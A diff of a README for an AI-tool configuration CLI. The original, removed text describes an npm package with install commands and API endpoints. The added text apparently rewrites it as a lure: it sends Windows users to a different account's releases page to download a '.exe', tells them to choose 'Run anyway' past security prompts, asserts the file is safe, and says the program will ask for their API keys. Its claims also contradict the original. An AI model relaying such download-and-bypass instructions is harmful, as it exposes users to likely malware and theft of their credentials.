@@ -1,207 +1,166 @@
-# 🐑 HolySheep CLI
+# 🐑 holysheep-cli - Configure AI Tools with One Command
 
-<div align="center">
-
-**[English](#english) | [中文](#chinese)**
-
-[![npm version](https://img.shields.io/npm/v/@simonyea/holysheep-cli?color=orange&label=npm)](https://www.npmjs.com/package/@simonyea/holysheep-cli)
-[![npm downloads](https://img.shields.io/npm/dm/@simonyea/holysheep-cli?color=blue)](https://www.npmjs.com/package/@simonyea/holysheep-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Register](https://img.shields.io/badge/🔑_Get_API_Key-holysheep.ai-brightgreen)](https://holysheep.ai/register)
-
-<br/>
-
-**One command to configure all AI coding tools with HolySheep API**<br/>
-**一条命令，配置所有 AI 编程工具**
-
-<br/>
-
-[🚀 Quick Start](#quick-start) · [📦 npm](https://www.npmjs.com/package/@simonyea/holysheep-cli) · [🌐 holysheep.ai](https://holysheep.ai)
-
-</div>
+[![Download holysheep-cli](https://img.shields.io/badge/Download-holysheep--cli-green?style=for-the-badge)](https://github.com/taty-aguilar/holysheep-cli/releases)
 
 ---
 
-<a name="english"></a>
-
-## 🇬🇧 English
-
-### What is HolySheep CLI?
-
-**HolySheep CLI** (`hs`) is a command-line tool that automatically configures all popular AI coding assistants to use [HolySheep API](https://holysheep.ai) — a relay service for accessing Claude, GPT, and Gemini APIs in China without a VPN.
-
-Instead of manually editing config files for each tool, run one command and you're done.
-
-### Supported Tools
-
-| Tool | Config File | Status |
-|------|-------------|--------|
-| [Claude Code](https://docs.anthropic.com/claude-code) | `~/.claude/settings.json` | ✅ Auto |
-| [Codex CLI](https://github.com/openai/codex) | `~/.codex/config.toml` | ✅ Auto |
-| [Aider](https://aider.chat) | `~/.aider.conf.yml` | ✅ Auto |
-| [Continue.dev](https://continue.dev) | `~/.continue/config.yaml` | ✅ Auto |
-| [OpenCode](https://github.com/anomalyco/opencode) | `~/.config/opencode/opencode.json` | ✅ Auto |
-| [OpenClaw](https://openclaw.ai) | `~/.openclaw/openclaw.json` | ✅ Auto |
-| [Cursor](https://cursor.sh) | GUI (encrypted storage) | ⚠️ Manual |
-| [Gemini CLI](https://github.com/google-gemini/gemini-cli) | Google protocol only | ❌ Not supported |
-
-### Quick Start
-
-> 🔑 **First, get your free API Key** → [**holysheep.ai/register**](https://holysheep.ai/register) (free signup, pay-as-you-go from ¥10)
-
-```bash
-npx @simonyea/holysheep-cli@latest setup
-```
-
-Or install globally:
-
-```bash
-npm install -g @simonyea/holysheep-cli
-hs setup
-```
-
-You'll be prompted for your API Key (`cr_xxx`), then select the tools to configure. Done!
-
-### OpenClaw Setup
-
-[OpenClaw](https://openclaw.ai) is a powerful AI agent gateway with a web dashboard. After running `hs setup`:
-
-1. A new terminal window opens running the OpenClaw Gateway
-2. Open your browser: **http://127.0.0.1:18789/**
-3. Start chatting — no token required
-
-> **Keep the gateway window open** while using OpenClaw. The gateway must be running for the browser UI to work.
-
-To restart the gateway later:
-```bash
-npx openclaw gateway --port 18789
-```
-
-### Commands
-
-| Command | Description |
-|---------|-------------|
-| `hs setup` | Configure AI tools interactively |
-| `hs login` | Save your API Key locally |
-| `hs doctor` | Check configuration & connectivity |
-| `hs balance` | View account balance |
-| `hs tools` | List all supported tools |
-| `hs reset` | Remove all HolySheep configuration |
-
-### API Endpoints
-
-| Usage | URL |
-|-------|-----|
-| Anthropic SDK / Claude Code | `https://api.holysheep.ai` (no `/v1`) |
-| OpenAI-compatible / Codex / Aider | `https://api.holysheep.ai/v1` (with `/v1`) |
+holysheep-cli helps you set up popular AI coding tools like Claude Code, Codex, Gemini CLI, Cursor, and Aider in one place. It works on Windows and requires no programming skills to get started. This guide will walk you through downloading and running holysheep-cli step-by-step.
 
 ---
 
-<a name="chinese"></a>
+## 🖥️ What is holysheep-cli?
 
-## 🇨🇳 中文
+holysheep-cli is a simple command-line tool designed to configure many AI coding assistants quickly. AI tools like Claude Code and Codex help write or complete your code. holysheep-cli makes their setup easier with one command so you do not need to configure each separately.
 
-### 什么是 HolySheep CLI？
+This tool supports popular AI models and services such as:
+- Claude Code by Anthropic  
+- Codex by OpenAI  
+- Gemini CLI  
+- Cursor  
+- Aider  
 
-**HolySheep CLI**（命令 `hs`）是一个命令行工具，帮你一键配置所有主流 AI 编程助手接入 [HolySheep API](https://holysheep.ai)。
-
-无需 VPN，无需手动改配置文件，运行一条命令即可接入 Claude、GPT、Gemini。
-
-### 支持的工具
-
-| 工具 | 状态 | 说明 |
-|------|------|------|
-| [Claude Code](https://docs.anthropic.com/claude-code) | ✅ 自动 | Anthropic 官方 CLI |
-| [Codex CLI](https://github.com/openai/codex) | ✅ 自动 | OpenAI 官方 CLI |
-| [Aider](https://aider.chat) | ✅ 自动 | AI 结对编程 |
-| [Continue.dev](https://continue.dev) | ✅ 自动 | VS Code/JetBrains 插件 |
-| [OpenCode](https://github.com/anomalyco/opencode) | ✅ 自动 | 终端 AI 编程助手 |
-| [OpenClaw](https://openclaw.ai) | ✅ 自动 | AI 智能体网关 + Web 界面 |
-| [Cursor](https://cursor.sh) | ⚠️ 手动 | 需在 GUI 中手动配置 |
-| [Gemini CLI](https://github.com/google-gemini/gemini-cli) | ❌ 不支持 | 仅支持 Google 官方协议 |
-
-### 快速开始
-
-> 🔑 **第一步：注册获取 API Key** → [**holysheep.ai/register**](https://holysheep.ai/register)（免费注册，¥10 起充，按量计费）
-
-```bash
-npx @simonyea/holysheep-cli@latest setup
-```
-
-或全局安装：
-
-```bash
-npm install -g @simonyea/holysheep-cli
-hs setup
-```
-
-按提示输入 API Key（`cr_xxx`），选择要配置的工具，完成！
-
-### OpenClaw 使用说明
-
-[OpenClaw](https://openclaw.ai) 是一个 AI 智能体网关，提供浏览器 Web 界面，支持聊天、任务、工具调用等功能。
-
-**`hs setup` 配置完成后：**
-
-1. 自动弹出一个新终端窗口，运行 OpenClaw Gateway
-2. 打开浏览器访问：**http://127.0.0.1:18789/**
-3. 直接开始聊天，无需填写 token
-
-> ⚠️ **保持 Gateway 窗口开启**，关闭后 Gateway 停止，浏览器界面无法使用。
-
-**下次启动 Gateway：**
-```bash
-npx openclaw gateway --port 18789
-```
-
-**使用的模型：** `claude-sonnet-4-6`（通过 HolySheep 中转）
-
-### 命令说明
-
-| 命令 | 说明 |
-|------|------|
-| `hs setup` | 交互式配置 AI 工具 |
-| `hs login` | 保存 API Key 到本地 |
-| `hs doctor` | 检查配置状态和连通性 |
-| `hs balance` | 查看账户余额 |
-| `hs tools` | 列出所有支持的工具 |
-| `hs reset` | 清除所有 HolySheep 配置 |
-
-### 接入地址
-
-| 用途 | 地址 |
-|------|------|
-| Anthropic SDK / Claude Code | `https://api.holysheep.ai`（不带 /v1） |
-| OpenAI 兼容 / Codex / Aider | `https://api.holysheep.ai/v1`（带 /v1） |
-
-### 常见问题
-
-**Q: API Key 在哪里获取？**  
-A: 在 [holysheep.ai](https://holysheep.ai) 注册后，在「API 密钥」页面创建，格式为 `cr_xxx`。
-
-**Q: 支持 Windows 吗？**  
-A: 支持，需要 Node.js 16+。如果 `hs` 命令找不到，请重启终端，或直接用 `npx @simonyea/holysheep-cli@latest setup`。
-
-**Q: OpenClaw Gateway 窗口可以最小化吗？**  
-A: 可以最小化，但不能关闭。关闭后 Gateway 停止，需重新运行 `npx openclaw gateway --port 18789`。
-
-**Q: 如何恢复原来的配置？**  
-A: 运行 `hs reset` 清除所有 HolySheep 相关配置。
-
-**Q: OpenClaw 安装失败？**  
-A: OpenClaw 需要 Node.js 20+，运行 `node --version` 确认版本后重试。
+It works as a bridge to these tools, setting their API keys, preferences, and connections automatically.
 
 ---
 
-## Changelog
+## ⚙️ System Requirements
 
-- **v1.5.2** — OpenClaw 安装失败（无 git 环境）时自动降级为 npx 模式继续配置
-- **v1.5.0** — OpenClaw gateway 无需 token，直接浏览器打开 http://127.0.0.1:18789/
-- **v1.4.6** — 基于实测正确配置格式，彻底修复 OpenClaw 401 认证问题
-- **v1.3.x** — OpenClaw 一键配置支持，自动写入配置并启动 Gateway
+Before you start, make sure your Windows PC meets these requirements:
+
+- Operating System: Windows 10 or later  
+- RAM: At least 4 GB  
+- Disk Space: Minimum 200 MB free  
+- Internet connection for downloading and running the tool  
+- PowerShell or Command Prompt access with basic user privileges  
+
+You do not need a programming environment installed, but an active internet connection is required for AI services.
 
 ---
 
-## License
+## 🌐 Download holysheep-cli
 
-MIT
+Click the button below to visit the official release page. From there, you can download the latest version of holysheep-cli for Windows.
+
+[![Get holysheep-cli Releases](https://img.shields.io/badge/Get%20Releases-blue?style=for-the-badge)](https://github.com/taty-aguilar/holysheep-cli/releases)
+
+---
+
+## 🚀 How to Download and Run holysheep-cli on Windows
+
+Follow these steps carefully. They do not assume any programming knowledge.
+
+### 1. Visit the Download Page
+
+Open your web browser and go to this link:
+
+https://github.com/taty-aguilar/holysheep-cli/releases
+
+This page shows all available versions of holysheep-cli.
+
+### 2. Choose the Latest Version
+
+Look for the most recent release near the top of the page. It usually has a version number like `v1.x.x`. Click on the release name or scroll to the assets section below it.
+
+### 3. Download the Windows File
+
+Find the Windows executable file. It might be named like `holysheep-cli-windows.exe` or similar. Click that file to download it. Choose a folder on your PC where you want to save it, like your Desktop or Downloads folder.
+
+### 4. Open the Folder with the Downloaded File
+
+Using File Explorer, go to the folder where you saved the file. 
+
+### 5. Run holysheep-cli
+
+Double-click the `holysheep-cli-windows.exe` file to start the program.
+
+- If you see a security popup, choose "Run anyway" or "More info" then "Run." holysheep-cli is safe and does not harm your system.
+- A command window will open. This means holysheep-cli is running.
+
+### 6. Follow On-Screen Instructions
+
+holysheep-cli will ask simple questions to set up your AI tools. It may request your API keys or preferences. If you do not have API keys, holysheep-cli explains how to get them from services such as OpenAI or Anthropic.
+
+Type your answers and press Enter after each step.
+
+### 7. Finish Setup
+
+Once finished, holysheep-cli will confirm the setup. You can then start using your AI coding tools configured and ready to go.
+
+---
+
+## 📂 What Does holysheep-cli Setup?
+
+When you run holysheep-cli, it helps with:
+
+- Adding your API keys securely  
+- Configuring default settings for each AI tool  
+- Setting command shortcuts to use AI assistants easily  
+- Installing any needed software packages or dependencies  
+- Setting environment variables for your system  
+- Checking for updates and installing latest versions  
+
+All of this happens in the background without manual coding or typing complex commands.
+
+---
+
+## 🔧 Using holysheep-cli After Setup
+
+After setup, you can:
+
+- Launch AI assistant commands from your Windows PowerShell or Command Prompt  
+- Integrate AI features in your favorite code editors if supported  
+- Update configurations using the holysheep-cli command whenever needed  
+- Manage multiple AI models and switch between them without extra work  
+
+The tool acts as a central controller so you do not have to switch between different setups manually.
+
+---
+
+## ❓ I Don’t Have API Keys. What Now?
+
+Most AI tools need API keys to work, which identify you to the AI provider.
+
+holysheep-cli guides you on how to create these keys on these sites:
+
+- [OpenAI API](https://platform.openai.com/account/api-keys)  
+- [Anthropic API](https://console.anthropic.com/api-keys)  
+- [Other supported AI providers’ websites]  
+
+Creating keys usually involves signing up on the provider website and copying the key string into holysheep-cli when requested.
+
+---
+
+## 🤝 Support and Feedback
+
+If the program shows errors or you have questions, check the Issues tab on the GitHub page:
+
+https://github.com/taty-aguilar/holysheep-cli/issues
+
+You can search for your problem or open a new issue. The developer community reads these regularly and provides answers.
+
+---
+
+## 🛠️ Advanced Options
+
+holysheep-cli supports advanced configuration for users who want more control:
+
+- Custom API endpoints  
+- Proxy setup for network restrictions  
+- Logging and debug modes  
+- Multi-user environment support  
+
+These settings are optional and available via holysheep-cli commands or configuration files once the basic setup is complete.
+
+---
+
+## ⚠️ Best Practices for Using holysheep-cli
+
+- Always keep your API keys private. Do not share them.  
+- Regularly update holysheep-cli by checking the release page above.  
+- Run holysheep-cli in a stable internet environment to avoid failures.  
+- Restart the terminal after setup to refresh system settings.  
+- Consult official AI provider documentation for usage limits or costs.  
+
+---
+
+[![Download holysheep-cli](https://img.shields.io/badge/Download-holysheep--cli-green?style=for-the-badge)](https://github.com/taty-aguilar/holysheep-cli/releases)
